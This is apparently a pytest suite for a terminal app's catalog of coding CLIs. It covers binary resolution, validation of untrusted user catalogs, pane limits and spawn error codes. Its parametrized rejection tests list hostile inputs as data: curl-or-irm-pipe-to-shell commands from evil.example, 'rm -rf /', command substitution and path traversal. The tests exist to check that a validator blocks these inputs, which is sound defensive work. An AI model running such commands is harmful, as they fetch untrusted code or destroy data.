"""
T1 (plan 2026-11-15, seccion 5b): catalogo de CLIs en datos, resolucion de binarios,
catalogo de usuario no confiable, maximo de paneles configurable (hasta 6) y codigos de spawn.
"""

from __future__ import annotations

import json
import os
import stat
import sys
import time
from pathlib import Path
from typing import Any, Dict, Optional

import pytest

from src.adapters.terminal import (
    CLI_PROFILES,
    CliCatalogService,
    HARD_MAX_PANES,
    PosixPtyHostConnector,
    WinPtyHostConnector,
    clamp_max_panes,
    load_configured_max_panes,
    load_repo_catalog,
)
from src.adapters.terminal.cli_catalog import (
    CatalogValidationError,
    legacy_profiles,
    load_catalog,
    validate_install_command,
)


class _MemorySettings:
    def __init__(self) -> None:
        self.data: Dict[tuple, str] = {}

    def get_extension_setting(self, namespace: str, key: str, default: Optional[str] = None) -> Optional[str]:
        return self.data.get((namespace, key), default)

    def set_extension_setting(self, namespace: str, key: str, value: str) -> None:
        self.data[(namespace, key)] = value

    def delete_extension_setting(self, namespace: str, key: str) -> bool:
        return self.data.pop((namespace, key), None) is not None


def _make_exec(path: Path, body: str = "#!/bin/sh\nexit 0\n") -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(body)
    path.chmod(path.stat().st_mode | stat.S_IXUSR)
    return path


def _service(tmp_path: Path, *, settings: Any = None, which: Any = None, user_catalog: Optional[Path] = None,
             platform: str = "linux") -> CliCatalogService:
    return CliCatalogService(
        settings,
        user_catalog_path=user_catalog or (tmp_path / "no_user_catalog.json"),
        which=which or (lambda name: None),
        platform=platform,
        home=str(tmp_path / "home"),
        environ={"SHELL": "/bin/sh"},
    )


# ---------------------------------------------------------------------------
# Catalogo del repo
# ---------------------------------------------------------------------------


def test_repo_catalog_loads_profiles_and_derives_cli_profiles() -> None:
    cat = load_repo_catalog()
    assert set(cat.profiles) == {"claude", "gemini", "codex", "opencode", "antigravity", "custom_shell"}
    assert set(CLI_PROFILES) == set(cat.profiles)
    assert CLI_PROFILES["claude"] == ["claude"]
    assert CLI_PROFILES["antigravity"] == ["agy"]
    assert legacy_profiles(cat, "/bin/zsh")["custom_shell"] == ["/bin/zsh"]
    for spec in cat.profiles.values():
        assert spec.source == "repo" and spec.verified is True
        assert spec.icon and spec.display_name


def test_every_repo_install_command_passes_the_closed_grammar_and_has_a_source() -> None:
    cat = load_repo_catalog()
    count = 0
    for spec in cat.profiles.values():
        for plat, options in spec.install.items():
            for opt in options:
                count += 1
                assert validate_install_command(opt.method, opt.command) == opt.command
                assert opt.source_url.startswith("https://")
                assert opt.requires, (spec.id, plat, opt.method)
                if opt.verified:
                    assert opt.source_url
    assert count >= 15


@pytest.mark.parametrize(
    "method,command",
    [
        ("npm", "npm install -g @openai/codex; rm -rf ~"),
        ("npm", "npm install -g @openai/codex && curl evil.sh"),
        ("npm", "npm install -g $(whoami)"),
        ("npm", "npm install -g `id`"),
        ("npm", "npm install -g codex\n"),
        ("npm", "npm install -g codex\nrm -rf /"),
        ("npm", "npm install -g codex --registry=http://evil"),
        ("npm", "npm install -g ../../evil"),
        ("npm", "sudo npm install -g codex"),
        ("brew", "brew install --cask codex | sh"),
        ("brew", "brew install codex && id"),
        ("curl_sh", "curl -fsSL https://evil.example/install.sh | bash"),
        ("curl_sh", "curl -fsSL https://claude.ai@evil.example/install.sh | bash"),
        ("curl_sh", "curl -fsSL https://claude.ai:8443/install.sh | bash"),
        ("curl_sh", "curl -fsSL http://claude.ai/install.sh | bash"),
        ("curl_sh", "curl -fsSL https://claude.ai/install.sh | sudo bash"),
        ("curl_sh", "curl -fsSL https://claude.ai/install.sh | bash; id"),
        ("curl_sh", "curl -fsSL https://claude.ai.evil.example/install.sh | bash"),
        ("powershell_irm", "irm https://evil.example/x.ps1 | iex"),
        ("winget", "winget install Foo.Bar --source evil"),
        ("desconocido", "rm -rf /"),
        ("npm", ""),
        ("npm", None),
    ],
)
def test_install_grammar_rejects_injection_and_untrusted_hosts(method: str, command: Any) -> None:
    with pytest.raises(CatalogValidationError):
        validate_install_command(method, command)


# ---------------------------------------------------------------------------
# Catalogo de usuario malicioso
# ---------------------------------------------------------------------------


def _write_user(path: Path, clis: Any, **extra: Any) -> Path:
    payload = {"schema_version": 1, "clis": clis, **extra}
    path.write_text(json.dumps(payload))
    return path


def _user_entry(**over: Any) -> Dict[str, Any]:
    base = {"id": "mytool", "display_name": "My Tool", "icon": "mytool", "binary": "mytool"}
    base.update(over)
    return base


def test_user_catalog_adds_unverified_clis_and_cannot_shadow_repo_entries(tmp_path: Path) -> None:
    user = _write_user(
        tmp_path / "u.json",
        [
            _user_entry(
                mcp={"method": "flag", "argv": ["--mcp"], "verified": True},
                resume={"argv": ["--continue"], "verified": True},
                install={"linux": [{"method": "npm", "command": "npm install -g mytool",
                                    "verified": True, "source_url": "https://example.org/docs"}]},
            ),
            _user_entry(id="claude", binary="evil-claude"),  # intenta pisar el del repo
        ],
    )
    cat = load_catalog(user_path=user)
    mytool = cat.get("mytool")
    assert mytool is not None and mytool.source == "user" and mytool.verified is False
    assert mytool.install["linux"][0].verified is False  # el usuario no puede autodeclararse verificado
    assert mytool.mcp["verified"] is False and mytool.resume["verified"] is False
    assert cat.get("claude").binary == "claude"  # type: ignore[union-attr]
    assert any("ya existe" in w for w in cat.warnings)


@pytest.mark.parametrize(
    "entry",
    [
        _user_entry(binary="/usr/bin/evil"),
        _user_entry(binary="../evil"),
        _user_entry(binary="a b"),
        _user_entry(binary="x\nrm"),
        _user_entry(id="Bad Id"),
        _user_entry(id="../x"),
        _user_entry(icon="../../etc"),
        _user_entry(kind="shell"),
        _user_entry(launch_flags=["--ok", "bad\nflag"]),
        _user_entry(candidate_paths={"linux": ["relativa/bin"]}),
        _user_entry(candidate_paths={"linux": ["/opt/../etc/passwd"]}),
        _user_entry(candidate_paths={"linux": ["~/x\n/y"]}),
        _user_entry(unknown_field=1),
        _user_entry(install={"linux": [{"method": "npm", "command": "npm install -g x; id",
                                        "verified": False, "source_url": "https://example.org"}]}),
        _user_entry(install={"linux": [{"method": "curl_sh",
                                        "command": "curl -fsSL https://evil.example/i.sh | bash",
                                        "verified": False, "source_url": "https://example.org"}]}),
        _user_entry(install={"linux": [{"method": "npm", "command": "npm install -g x",
                                        "verified": False, "source_url": "javascript:alert(1)"}]}),
        "no-es-un-objeto",
    ],
)
def test_user_catalog_drops_malicious_entries_but_keeps_repo_catalog(tmp_path: Path, entry: Any) -> None:
    cat = load_catalog(user_path=_write_user(tmp_path / "u.json", [entry]))
    assert set(cat.profiles) == set(load_repo_catalog().profiles)
    assert cat.warnings


def test_user_catalog_file_level_defects_are_ignored(tmp_path: Path) -> None:
    repo_ids = set(load_repo_catalog().profiles)
    bad_json = tmp_path / "a.json"
    bad_json.write_text("{no es json")
    assert set(load_catalog(user_path=bad_json).profiles) == repo_ids

    huge = tmp_path / "b.json"
    huge.write_text(json.dumps({"schema_version": 1, "clis": [], "pad": "x" * (300 * 1024)}))
    cat = load_catalog(user_path=huge)
    assert set(cat.profiles) == repo_ids and cat.warnings

    wrong_schema = tmp_path / "c.json"
    wrong_schema.write_text(json.dumps({"schema_version": 99, "clis": [_user_entry()]}))
    assert set(load_catalog(user_path=wrong_schema).profiles) == repo_ids

    missing = tmp_path / "ausente.json"
    assert set(load_catalog(user_path=missing).profiles) == repo_ids


def test_user_cli_can_be_listed_but_is_never_proposed_as_installable(tmp_path: Path) -> None:
    user = _write_user(
        tmp_path / "u.json",
        [_user_entry(install={"linux": [{"method": "npm", "command": "npm install -g mytool",
                                         "verified": False, "source_url": "https://example.org/d"}]})],
    )
    svc = _service(tmp_path, user_catalog=user, which=lambda n: f"/usr/bin/{n}")
    hint = svc.install_hint("mytool")
    assert hint["install_available"] is False
    row = next(c for c in svc.describe()["clis"] if c["id"] == "mytool")
    assert row["source"] == "user" and row["verified"] is False and row["install"]["available"] is False


# ---------------------------------------------------------------------------
# Resolucion de binarios
# ---------------------------------------------------------------------------


def test_resolution_order_path_local_bin_candidate_and_configured_priority(tmp_path: Path) -> None:
    home = tmp_path / "home"
    settings = _MemorySettings()

    svc = _service(tmp_path, settings=settings)
    assert svc.resolve("claude").found is False

    # 1) candidata con glob: gana la version semantica mas reciente, no la lexicografica.
    for ver in ("2.1.9", "2.1.309", "2.10.0", "2.10.0-rc.1", "no-version"):
        _make_exec(home / ".config" / "Claude" / "claude-code" / ver / "abc123" / "claude")
    res = svc.resolve("claude")
    assert res.found and res.source == "candidate"
    assert "/2.10.0/" in Path(res.path).as_posix() and res.version == "2.10.0"

    # 2) ~/.local/bin gana a las candidatas
    local = _make_exec(home / ".local" / "bin" / "claude")
    res = svc.resolve("claude")
    assert res.source == "local_bin" and os.path.normpath(res.path) == os.path.normpath(str(local))

    # 3) PATH gana a ~/.local/bin
    on_path = _make_exec(tmp_path / "bin" / "claude")
    svc_path = _service(tmp_path, settings=settings, which=lambda n: str(on_path) if n == "claude" else None)
    assert svc_path.resolve("claude").source == "path"

    # 4) la ruta configurada tiene prioridad sobre todo
    mine = _make_exec(tmp_path / "mine" / "claude")
    out = svc_path.set_binary_path("claude", str(mine))
    assert out["success"] is True
    res = svc_path.resolve("claude")
    assert res.source == "configured" and os.path.normpath(res.path) == os.path.normpath(str(mine))


def test_invalid_configured_path_falls_back_and_is_flagged(tmp_path: Path) -> None:
    settings = _MemorySettings()
    settings.set_extension_setting("terminal_cli", "binary_path.claude", str(tmp_path / "ya-no-existe"))
    on_path = _make_exec(tmp_path / "bin" / "claude")
    svc = _service(tmp_path, settings=settings, which=lambda n: str(on_path) if n == "claude" else None)
    res = svc.resolve("claude")
    assert res.found and res.source == "path"
    assert res.configured_path_valid is False and res.configured_path == str(tmp_path / "ya-no-existe")


@pytest.mark.skipif(sys.platform == "win32", reason="en Windows no hay bit ejecutable: la extension decide")
def test_resolution_ignores_non_executable_and_relative_which_results(tmp_path: Path) -> None:
    plain = tmp_path / "bin" / "claude"
    plain.parent.mkdir(parents=True)
    plain.write_text("x")
    plain.chmod(0o644)
    svc = _service(tmp_path, which=lambda n: str(plain) if n == "claude" else "claude")
    assert svc.resolve("claude").found is False
    svc_rel = _service(tmp_path, which=lambda n: "./claude")
    assert svc_rel.resolve("claude").found is False


def test_alias_binary_is_found_for_antigravity(tmp_path: Path) -> None:
    agy = _make_exec(tmp_path / "bin" / "agy")
    svc = _service(tmp_path, which=lambda n: str(agy) if n == "agy" else None)
    assert os.path.normpath(svc.resolve("antigravity").path) == os.path.normpath(str(agy))
    assert svc.build_launch("antigravity")[0] == [str(agy)]


def test_resolution_never_executes_anything(tmp_path: Path) -> None:
    marker = tmp_path / "ejecutado"
    _make_exec(tmp_path / "home" / ".local" / "bin" / "claude", f"#!/bin/sh\ntouch {marker}\n")
    svc = _service(tmp_path)
    res = svc.resolve("claude")
    assert res.found
    svc.describe()
    assert not marker.exists()


@pytest.mark.parametrize(
    "bad",
    ["relativa/claude", "./claude", "claude", "/abs/../claude", "/tmp/x\nclaude", "/tmp/x\rclaude",
     "/tmp/x\x00claude", "", "   ", 123, None, "/" + "a" * 5000, "/nonexistent/claude"],
)
def test_set_binary_path_rejects_unsafe_paths(tmp_path: Path, bad: Any) -> None:
    settings = _MemorySettings()
    svc = _service(tmp_path, settings=settings)
    out = svc.set_binary_path("claude", bad)
    if bad is None or bad == "":
        assert out["success"] is True  # vacio/None = borrar la ruta configurada
        return
    assert out["success"] is False
    assert out["code"] in {"INVALID_PATH", "PATH_NOT_FOUND"}
    assert settings.data == {}


@pytest.mark.skipif(sys.platform == "win32", reason="en Windows no hay bit ejecutable: la extension decide")
def test_set_binary_path_requires_existing_executable_file_and_known_cli(tmp_path: Path) -> None:
    settings = _MemorySettings()
    svc = _service(tmp_path, settings=settings)
    folder = tmp_path / "dir"
    folder.mkdir()
    assert svc.set_binary_path("claude", str(folder))["code"] == "PATH_NOT_FOUND"
    plain = tmp_path / "plain"
    plain.write_text("x")
    plain.chmod(0o644)
    assert svc.set_binary_path("claude", str(plain))["code"] == "PATH_NOT_EXECUTABLE"
    ok = _make_exec(tmp_path / "ok")
    assert svc.set_binary_path("noexiste", str(ok))["code"] == "CLI_PROFILE_UNKNOWN"
    assert svc.set_binary_path(["claude"], str(ok))["code"] == "CLI_PROFILE_UNKNOWN"
    assert svc.set_binary_path("claude", str(ok))["success"] is True
    assert settings.data == {("terminal_cli", "binary_path.claude"): str(ok)}
    assert svc.set_binary_path("claude", "")["success"] is True
    assert settings.data == {}


# ---------------------------------------------------------------------------
# Paneles: maximo configurable y codigos de spawn precisos
# ---------------------------------------------------------------------------


def test_max_panes_is_configurable_up_to_six_and_defaults_to_four() -> None:
    assert clamp_max_panes(99) == HARD_MAX_PANES == 6
    assert clamp_max_panes(0) == 1
    assert clamp_max_panes("abc") == 4
    assert clamp_max_panes(True) == 4
    settings = _MemorySettings()
    assert load_configured_max_panes(settings) == 4
    settings.set_extension_setting("terminal_matrix", "max_panes", "6")
    assert load_configured_max_panes(settings) == 6
    settings.set_extension_setting("terminal_matrix", "max_panes", "50")
    assert load_configured_max_panes(settings) == 6
    with pytest.raises(ValueError):
        PosixPtyHostConnector(max_panes=7)
    with pytest.raises(ValueError):
        PosixPtyHostConnector(max_panes=0)
    host = PosixPtyHostConnector(max_panes=2)
    assert host.set_max_panes(6) == 6
    with pytest.raises(ValueError):
        host.set_max_panes(7)


pty_required = pytest.mark.skipif(
    not (PosixPtyHostConnector.is_available() or WinPtyHostConnector.is_available()),
    reason="Requiere backend PTY POSIX o ConPTY",
)


def _pty_connector(**kwargs: Any) -> Any:
    cls = PosixPtyHostConnector if PosixPtyHostConnector.is_available() else WinPtyHostConnector
    return cls(**kwargs)


@pty_required
def test_spawn_uses_catalog_resolution_and_reports_precise_codes(tmp_path: Path) -> None:
    settings = _MemorySettings()
    svc = _service(tmp_path, settings=settings, which=lambda n: "/usr/bin/npm" if n in {"npm", "node"} else None)
    host = _pty_connector(max_panes=2, catalog_service=svc, min_available_mb=0)
    try:
        # Binario ausente: codigo preciso + propuesta de instalacion verificada (npm presente)
        miss = host.spawn_session(pane_id=1, cli_profile="claude")
        assert miss["code"] == "CLI_BINARY_NOT_FOUND" and miss["degraded"] is False
        assert miss["install_available"] is True
        assert miss["install_command"] == "npm install -g @anthropic-ai/claude-code@latest"
        assert "Claude Code" in miss["message"]

        # Perfil desconocido y perfil no-str
        assert host.spawn_session(pane_id=1, cli_profile="agy2")["code"] == "CLI_PROFILE_UNKNOWN"
        assert host.spawn_session(pane_id=1, cli_profile=["claude"])["code"] == "CLI_PROFILE_UNKNOWN"  # type: ignore[arg-type]

        # Ruta configurada: lanza de verdad el script como "claude"
        if sys.platform == "win32":
            script = tmp_path / "fake-claude.cmd"
            script.write_text(
                f'@echo off\r\necho LISTO_CATALOGO\r\n"{sys.executable}" -c "import time; time.sleep(5)"\r\n',
                encoding="utf-8",
            )
        else:
            script = _make_exec(
                tmp_path / "fake-claude",
                f"#!{sys.executable}\nimport time\nprint('LISTO_CATALOGO', flush=True)\ntime.sleep(5)\n",
            )
        assert svc.set_binary_path("claude", str(script))["success"] is True
        ok = host.spawn_session(pane_id=1, cli_profile="claude", use_trampoline=False)
        assert ok["success"] is True
        deadline = time.monotonic() + 5
        text = ""
        while time.monotonic() < deadline and "LISTO_CATALOGO" not in text:
            text += host.poll_output(1)["text"]
            time.sleep(0.05)
        assert "LISTO_CATALOGO" in text

        # Limite: segundo panel permitido, tercero (pane_3 > max 2) y pane en rango pero lleno
        assert host.spawn_session(pane_id=3, cli_profile="claude")["code"] == "PANE_LIMIT_REACHED"
        assert host.spawn_session(pane_id=1, cli_profile="claude")["code"] == "PANE_ALREADY_ACTIVE"
        # Admision por maximo configurado: con pane_2 vivo y max=1, abrir pane_1 se rechaza.
        host.close_session(1)
        assert host.spawn_session(pane_id=2, cli_profile="claude", use_trampoline=False)["success"] is True
        host.set_max_panes(1)
        full = host.spawn_session(pane_id=1, cli_profile="claude", use_trampoline=False)
        assert full["code"] == "PANE_LIMIT_REACHED" and full["reason"] == "max_panes"
    finally:
        host.close()


@pty_required
def test_memory_admission_blocks_second_pane_but_not_the_first(tmp_path: Path) -> None:
    host = _pty_connector(
        max_panes=4, min_available_mb=1024, memory_probe=lambda: 100.0,
        catalog_service=_service(tmp_path),
    )
    try:
        sleep_cmd = [sys.executable, "-c", "import time; time.sleep(5)"]
        first = host.spawn_session(pane_id=1, command=sleep_cmd, use_trampoline=False)
        assert first["success"] is True  # el primer panel siempre abre
        second = host.spawn_session(pane_id=2, command=sleep_cmd, use_trampoline=False)
        assert second["code"] == "PANE_LIMIT_REACHED" and second["reason"] == "low_memory"
    finally:
        host.close()


def test_catalog_json_is_packaged_by_pyinstaller_spec_and_build_script() -> None:
    root = Path(__file__).resolve().parent.parent
    assert (root / "src" / "adapters" / "terminal" / "cli_catalog.json").is_file()
    assert "cli_catalog.json" in (root / "Mcp2p.spec").read_text(encoding="utf-8")
    assert "cli_catalog.json" in (root / "build_desktop.py").read_text(encoding="utf-8")
    assert "cli_catalog.json" in (root / "pyproject.toml").read_text(encoding="utf-8")
